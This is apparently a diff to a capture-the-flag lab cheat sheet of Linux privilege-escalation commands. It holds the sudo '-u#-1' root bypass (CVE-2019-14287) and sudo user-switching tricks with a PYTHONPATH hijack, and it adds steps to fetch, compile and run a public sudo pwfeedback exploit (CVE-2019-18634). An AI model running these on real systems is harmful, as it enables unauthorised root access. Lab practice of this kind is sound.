@@ -34,6 +34,13 @@ sudo echo "10.10.10.10 webenum.thm" >> /etc/hosts
 sudo echo "10.10.10.10 mysubdomain.webenum.thm" >> /etc/hosts
 ---------------------------------------------------------------------
 sudo -u#-1 /bin/bash # CVE-2019-14287
+---------------------------------------------------------------------
+# pwfeedback - CVE-2019-18634
+wget https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c
+# transfer exploit.c target file to target 
+gcc exploit.c -o exploit
+./exploit
+---------------------------------------------------------------------
 sudo -u silvio /usr/bin/zip # run with another user
 sudo -u jordan PYTHONPATH=/tmp /opt/scripts/flag.py # run with PYTHONPATH 
 
